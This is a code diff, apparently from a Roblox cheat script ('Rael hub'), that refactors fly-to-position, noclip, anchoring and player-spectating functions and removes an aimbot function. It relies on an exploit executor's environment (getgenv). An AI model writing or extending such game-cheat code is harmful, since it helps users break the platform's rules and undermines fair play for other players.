+        task.spawn(function()
+            rootPlayer.Anchored = true
+            task.wait(time)
+            rootPlayer.Anchored = false
+        end)
+        return "Done!"
+    end
+
+    rootPlayer.Anchored = true
+    task.wait(time)
+    rootPlayer.Anchored = false
+    return "Done!"
+end
+
+function raelhubfunctions.FlyToPosition(targetPosition: Vector3, speed: number)
   
-  if HumanoidRootPart then
-  
+    local rootPlayer = (Character and Character:FindFirstChild("HumanoidRootPart"))
+    if not rootPlayer then return warn("[Rael hub error] the rootPlayer not exist") end 
+
     local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Name = "Fly to position"
     bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
-    bodyVelocity.Velocity = (targetPosition - HumanoidRootPart.Position).unit * speed
-    bodyVelocity.Parent = HumanoidRootPart
-    
-    _G.RaelHubFlyService = RunService.Stepped:Connect(function()
-      
-      if (targetPosition - HumanoidRootPart.Position).magnitude < 5 then
+    bodyVelocity.Velocity = (targetPosition - rootPlayer.Position).unit * speed
+    bodyVelocity.Parent = rootPlayer
+
+    shared.connections["flyToPosition"] = RunService.Stepped:Connect(function()
         
-        bodyVelocity:Destroy()
+        if (targetPosition - rootPlayer.Position).magnitude > 5 then return end
+        if bodyVelocity then bodyVelocity:Destroy() end
+
+        if shared.connections["flyToPosition"] then
+            shared.connections["flyToPosition"]:Disconnect()
+            shared.connections["flyToPosition"] = nil
+        end
         
-        _G.RaelHubFlyService:Disconnect()
-        _G.RaelHubFlyService = nil
-        
-        HumanoidRootPart.CFrame = CFrame.new(targetPosition)
-        
-      end
+        rootPlayer.CFrame = CFrame.new(targetPosition)
     end)
-  end
 end
 
-function RaelHubFunction.StopFly()
-  if _G.RaelHubFlyService then
-    _G.RaelHubFlyService:Disconnect()
-    _G.RaelHubFlyService = nil
-  end
+function raelhubfunctions.StopFly()
+    if not shared.connections["flyToPosition"] then return end
+    shared.connections["flyToPosition"]:Disconnect()
+    shared.connections["flyToPosition"] = nil
 end
 
-function RaelHubFunction.NoClip(value)
-  getgenv().RaelHubNoclip = value
+function raelhubfunctions.NoClip(value: boolean)
+    _env.RaelHubNoclip = value
 
-  local function NoclipEnabled()
-    if not shared.Character then return end
+    local function noClip(state: boolean)
+        if not Character then return end
+        for _, part: BasePart | MeshPart in ipairs(Character:GetDescendants()) do
+            if (not part:IsA("BasePart") and not part:IsA("MeshPart")) then continue end
 
-    for _, part in pairs(shared.Character:GetDescendants()) do
-      if part:IsA("BasePart") and part.CanCollide == true then
-        part.CanCollide = false
-        part:SetAttribute("RaelHubNoClip", true)
-      end
+            if state then
+                if part.CanCollide then
+                    part.CanCollide = false
+                    part:SetAttribute("RaelHubNoClip", true)
+                end
+            else
+                if part:GetAttribute("RaelHubNoClip") then
+                    part.CanCollide = true
+                    part:SetAttribute("RaelHubNoClip", nil)
+                end
+            end
+        end
     end
-  end
 
-  local function NoclipDisable()
-    if not shared.Character then return end
-
-    for _, part in pairs(shared.Character:GetDescendants()) do
-      if part:IsA("BasePart") and part:GetAttribute("RaelHubNoClip") then
-        part.CanCollide = true
-      end
+    if not _env.RaelHubNoclip then
+        if shared.connections["noClip"] then
+          shared.connections["noClip"]:Disconnect()
+          shared.connections["noClip"] = nil
+        end
+        noClip(false)
+        return "Noclip Disabled"
     end
-  end
 
-  if not getgenv().RaelHubNoclip then
-    if shared.Noclip then
-      shared.Noclip:Disconnect()
-      shared.Noclip = nil
-      NoclipDisable()
-    end
-    return "Noclip Disabled"
-  end
-
-  NoclipEnabled()
-  shared.Noclip = game:GetService("RunService").Heartbeat:Connect(NoclipEnabled)
-  return "Noclip Enabled"
+    noClip(true)
+    shared.connections["noClip"] = RunService.Heartbeat:Connect(function()
+      noClip(true)
+    end)
+    return "Noclip Enabled"
 end
 
-function RaelHubFunction.SpectatePlayer(value, playername)
+function raelhubfunctions.SpectatePlayer(value: boolean, username: string)
   
-  getgenv().RaelHubSpectatePlayer = value
-  
-  local function spectateplayer()
+  _env.RaelHubSpectatePlayer = value
+
+  local function spectateplayer(username: string)
+    local playerTarget: Player = Players:FindFirstChild(username)
+    local characterTarget: Model = (playerTarget and playerTarget.Character)
+    local humanoidTarget: Humanoid = (characterTarget and characterTarget:FindFirstChild("Humanoid"))
     
-    local player = Players:FindFirstChild(playername)
-    
-    if player then
-      
-      local playercharacter = player.Character
-    
-      if not playercharacter then return end
-      
-      local TargetHumanoid = playercharacter:FindFirstChild("Humanoid")
-      
-      if TargetHumanoid then
-        
-        Camera.CameraSubject = TargetHumanoid
-        
-      end
-    end
+    if not humanoidTarget then warn("[Rael hub error] player or character or humanoid not exist"); return end
+
+    Camera.CameraSubject = humanoidTarget
   end
   
   task.spawn(function()
-  
-    while getgenv().RaelHubSpectatePlayer do
-      spectateplayer()
+    while _env.RaelHubSpectatePlayer do
+      spectateplayer(username)
       task.wait()
     end
     
-    if not getgenv().RaelHubSpectatePlayer then
-      
-      local Humanoid = Character:FindFirstChild("Humanoid")
-      
-      if Humanoid then
-        Camera.CameraSubject = Humanoid
-      end
-      
+    if not _env.RaelHubSpectatePlayer then
+      local humanoid: Humanoid = Character:FindFirstChild("Humanoid")
+      if not humanoid then warn("[Rael hub error] your humanoid not exist"); return end
+      Camera.CameraSubject = humanoid
     end
   end)
 end
 
-function RaelHubFunction.AimbotPlayer(value, player, target)
-  
-  local Target_Part = target
-  
-  if Target_Part == "Torso" then Target_Part = "HumanoidRootPart" end
-  
-  getgenv().RaelHubAimbotValue = value
-  getgenv().RaelHubAimbotTarget = Target_Part
-  
-  for _, Player in ipairs(Players:GetPlayers()) do
-    if Player.Name == player then
-      
-      local Target_Character = Player.Character
-      
-      if Target_Character then
-        getgenv().RaelHubAimbotPlayer = Target_Character
-      end
-      break
-    end
-  end
-end
-
-function RaelHubFunction.fly(value, speed)
+function raelhubfunctions.fly(value, speed)
   flyModule.flymodel1(value, speed)
 end
 
-function RaelHubFunction.flyV2(value, speed)
+function raelhubfunctions.flyV2(value, speed)
   flyModule.flymodel2(value, speed)
 end
 
-shared.RaelHubFunction = RaelHubFunction
+shared.RaelHubFunction = raelhubfunctions
 
-return RaelHubFunction
+return raelhubfunctions
